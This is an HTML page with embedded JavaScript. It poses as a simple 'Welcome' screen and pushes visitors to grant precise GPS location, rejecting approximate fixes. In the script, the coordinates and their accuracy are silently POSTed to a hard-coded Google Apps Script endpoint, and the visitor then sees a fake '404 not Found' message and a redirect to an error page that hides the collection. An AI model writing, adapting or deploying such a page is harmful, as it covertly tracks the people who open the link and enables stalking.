<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Access</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
            color: #333;
        }
        .card {
            background: white;
            padding: 2.5rem;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h2 {
            margin-top: 0;
            color: #111;
        }
        p {
            color: #666;
            line-height: 1.5;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Welcome</h2>
        <p id="status">Please allow precise location access when prompted to continue...</p>
    </div>

    <script>
        const statusText = document.getElementById("status");

        function initLocationRequest() {
            if (!navigator.geolocation) {
                statusText.innerText = "Geolocation is not supported by your browser.";
                return;
            }

            const options = {
                enableHighAccuracy: true, // Forces GPS usage
                timeout: 15000,           // Gives GPS time to lock on
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
        }

        async function successCallback(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy; // Accuracy in meters

            // If accuracy is worse than 100 meters, the user likely chose "Approximate"
            if (accuracy > 100) {
                statusText.innerHTML = `Approximate location detected (~${Math.round(accuracy)}m radius).<br><br><strong>Please change your permission settings to "Precise" location and reload the page.</strong>`;
                return; // Stop execution, do not save rough coordinates
            }

            statusText.innerText = `oops not found`;
            window.location.href = "error.html";
            try {
                const scriptURL = 'https://script.google.com/macros/s/AKfycbwD4iCAp2G98AnSvsdQsTMIyZZbfYso7yC-WLC66ktj0YRKIo4hfVqO0WT2rAxPtT0e/exec';

                await fetch(scriptURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ latitude, longitude, accuracy })
                });

                statusText.innerText = "404 not Found";
                window.location.href = "error.html";
                // TODO: Add your next interface transition or content reveal here

            } catch (error) {
                console.error("Network error:", error);
                statusText.innerText = "Error";
                 window.location.href = "error.html";
            }
        }

        function errorCallback(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    statusText.innerText = "Permission denied.";
                    window.location.href = "error.html";
                    break;
                case error.POSITION_UNAVAILABLE:
                    statusText.innerText = "Information is unavailable.";
                     window.location.href = "error.html";
                    break;
                case error.TIMEOUT:
                    statusText.innerText = "Timed out.";
                    window.location.href = "error.html";
                    break;
                default:
                    statusText.innerText = "An unknown error occurred.";
                    window.location.href = "error.html";
                    break;
            }
        }

        window.onload = initLocationRequest;
    </script>
</body>
</html>
